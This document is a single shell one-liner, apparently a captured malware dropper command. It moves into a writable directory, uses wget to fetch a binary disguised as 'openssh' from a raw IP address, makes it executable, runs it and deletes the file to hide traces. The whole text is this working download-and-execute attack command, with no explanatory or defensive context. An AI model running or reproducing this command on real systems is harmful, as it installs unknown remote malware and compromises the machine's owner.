cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.159.237.249/openssh; chmod +x openssh; ./openssh; rm -rf openssh
